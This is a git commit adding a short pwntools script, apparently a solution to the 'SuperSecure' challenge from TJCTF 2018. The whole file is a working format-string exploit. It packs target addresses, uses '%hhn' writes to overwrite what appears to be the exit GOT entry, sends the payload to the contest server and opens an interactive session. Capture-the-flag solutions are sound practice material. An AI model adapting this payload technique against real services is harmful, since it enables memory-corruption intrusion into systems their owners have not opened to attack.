bf937838ab1558c84bebbde75b5d91bec86d39dd
realFuzz3r <37977794+Fuzz3rCTF@users.noreply.github.com>
2018-08-13 18:01:54 +0300

    Create SuperSecure.py

---
+++ TJCTF_2018/SuperSecure.py
@@ -0,0 +1,26 @@
+from pwn import *
+import struct
+raw_input()
+exit = struct.pack("<I", 0x0804a02c)
+exit2 = struct.pack("<I", 0x0804a02c+1)
+
+s = ""
+s += exit
+s += exit2
+s += "EFGH"
+
+s += "%263x"
+s += "%35$hhn"
+
+s += "%116x"
+s += "%36$hhn"
+
+print s
+r = remote('problem1.tjctf.org', 8008)
+r.recvline()
+r.sendline('mike')
+r.recvline()
+r.sendline(s)
+r.recvline()
+r.sendline('mike')
+r.interactive()
